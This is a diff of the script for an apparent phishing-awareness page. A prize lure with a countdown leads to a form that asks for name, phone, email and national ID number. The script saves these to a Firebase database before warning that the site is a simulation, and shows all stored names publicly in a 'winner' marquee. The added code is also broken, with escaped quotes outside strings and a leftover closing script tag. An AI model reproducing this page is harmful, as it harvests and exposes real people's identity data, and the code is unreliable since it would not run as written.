@@ -79,79 +79,92 @@
     </div>
   </div>
 
-  <script>
-    // Firebase 設定
-    const firebaseConfig = {
-      apiKey: "AIzaSyBLGufRiE--W_CJu98AZph9TsRLCHuaxr0",
-      authDomain: "fir-fc9d0.firebaseapp.com",
-      databaseURL: "https://fir-fc9d0-default-rtdb.firebaseio.com",
-      projectId: "fir-fc9d0",
-      storageBucket: "fir-fc9d0.appspot.com",
-      messagingSenderId: "490554276031",
-      appId: "1:490554276031:web:8bc5c2a66b0ed63c1ee0a",
-      measurementId: "G-F8SLYQ5LQN"
-    };
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
+  <!-- Firebase CDN -->
+<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
 
-    let clickCount = 0;
+<script>
+  const firebaseConfig = {
+    apiKey: "AIzaSyBLGufRiE--W_CJu98AZph9TsRLCHuaxr0",
+    authDomain: "fir-fc9d0.firebaseapp.com",
+    databaseURL: "https://fir-fc9d0-default-rtdb.firebaseio.com",
+    projectId: "fir-fc9d0",
+    storageBucket: "fir-fc9d0.appspot.com",
+    messagingSenderId: "490554276031",
+    appId: "1:490554276031:web:8bc5c2a66b0ed63c1ee0a",
+    measurementId: "G-F8SLYQ5LQN"
+  };
 
-    function startTimer() {
-      let timeLeft = 300;
-      const timer = setInterval(() => {
-        const m = Math.floor(timeLeft / 60);
-        const s = (timeLeft % 60).toString().padStart(2, '0');
-        document.getElementById('timer').textContent = `${m}:${s}`;
-        if (--timeLeft < 0) clearInterval(timer);
-      }, 1000);
-    }
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.database();
 
-    function clickLucky() {
-      clickCount++;
-      document.getElementById('clickCount').textContent = clickCount;
-      document.getElementById('homepage').style.display = 'none';
-      document.getElementById('formPage').style.display = 'block';
-    }
+  let clickCount = 0;
 
-    function submitForm(event) {
-      event.preventDefault();
-      const name = document.getElementById('name').value;
-      const phone = document.getElementById('phone').value;
-      const email = document.getElementById('email').value;
-      const idcard = document.getElementById('idcard').value;
+  function startTimer() {
+    let timeLeft = 300;
+    const timer = setInterval(() => {
+      const m = Math.floor(timeLeft / 60);
+      const s = (timeLeft % 60).toString().padStart(2, '0');
+      document.getElementById('timer').textContent = `${m}:${s}`;
+      if (--timeLeft < 0) clearInterval(timer);
+    }, 1000);
+  }
 
-      // 寫入 Firebase
-      const entry = db.ref('entries').push();
-      entry.set({ name, phone, email, idcard }).then(() => {
-        alert("⚠️ 提醒您：這是一個釣魚詐騙模擬網站，請勿輸入真實資料！");
-        updateMarquee();
-        document.getElementById('formPage').style.display = 'none';
-        document.getElementById('warningPage').style.display = 'block';
-      });
-    }
+  function clickLucky() {
+    clickCount++;
+    document.getElementById('clickCount').textContent = clickCount;
+    document.getElementById('homepage').style.display = 'none';
+    document.getElementById('formPage').style.display = 'block';
+  }
 
-    function updateMarquee() {
-      db.ref('entries').once('value', snapshot => {
-        const data = snapshot.val();
-        const names = Object.values(data || {}).map(d => `${d.name} 中獎！`).join(' ');
-        document.getElementById('marqueeText').textContent = `🎉 ${names}`;
-      });
-    }
+  function submitForm(event) {
+    event.preventDefault();
+    const name = document.getElementById('name').value;
+    const phone = document.getElementById('phone').value;
+    const email = document.getElementById('email').value;
+    const idcard = document.getElementById('idcard').value;
 
-    function goHome() {
-      document.getElementById('warningPage').style.display = 'none';
-      document.getElementById('homepage').style.display = 'block';
-      document.getElementById('name').value = '';
-      document.getElementById('phone').value = '';
-      document.getElementById('email').value = '';
-      document.getElementById('idcard').value = '';
+    const entryRef = db.ref('entries').push();
+    entryRef.set({ name, phone, email, idcard }).then(() => {
+      alert(\"⚠️ 提醒您：這是一個釣魚詐騙模擬網站，請勿輸入真實資料！\");
       updateMarquee();
-    }
+      document.getElementById('formPage').style.display = 'none';
+      document.getElementById('warningPage').style.display = 'block';
+    }).catch(err => {
+      alert(\"提交失敗，請稍後再試！\");
+      console.error(err);
+    });
+  }
 
-    window.onload = () => {
-      startTimer();
-      updateMarquee();
-    }
+  function updateMarquee() {
+    db.ref('entries').once('value').then(snapshot => {
+      const data = snapshot.val();
+      const names = Object.values(data || {}).map(d => `${d.name} 中獎！`).join(' ');
+      document.getElementById('marqueeText').textContent = `🎉 ${names}`;
+    });
+  }
+
+  function goHome() {
+    document.getElementById('warningPage').style.display = 'none';
+    document.getElementById('homepage').style.display = 'block';
+    document.getElementById('name').value = '';
+    document.getElementById('phone').value = '';
+    document.getElementById('email').value = '';
+    document.getElementById('idcard').value = '';
+    updateMarquee();
+  }
+
+  window.onload = function () {
+    startTimer();
+    updateMarquee();
+  };
+
+  // 綁定全域函式
+  window.clickLucky = clickLucky;
+  window.submitForm = submitForm;
+  window.goHome = goHome;
+</script>
+
   </script>
 </body>
 </html>
